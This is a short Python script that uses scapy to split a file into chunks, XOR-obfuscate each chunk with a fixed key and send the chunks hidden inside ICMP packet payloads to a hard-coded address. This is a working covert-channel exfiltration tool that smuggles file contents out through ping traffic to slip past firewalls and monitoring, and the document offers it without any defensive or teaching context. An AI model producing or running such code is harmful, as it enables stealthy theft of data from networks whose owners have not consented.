import scapy.all as scapy
import os
import time

def xor_data(data, key=68):
    return bytes([b ^ key for b in data])

def send_file_icmp(file_path, dest_ip, chunk_size=1024):
    with open(file_path, 'rb') as file:
        seq_num = 0  
        
        while chunk := file.read(chunk_size):
            encrypted_chunk = xor_data(chunk)  
            
            packet = scapy.IP(dst=dest_ip) / scapy.ICMP(seq=seq_num) / encrypted_chunk
            
            scapy.send(packet, verbose=False)
            print(f"Sent chunk {seq_num}")
            
            seq_num += 1
            time.sleep(0.1)  

        print(f"File {file_path} sent successfully!")

if __name__ == "__main__":
    file_path = "file.7z"      
    dest_ip = "192.168.1.23"   
    send_file_icmp(file_path, dest_ip)
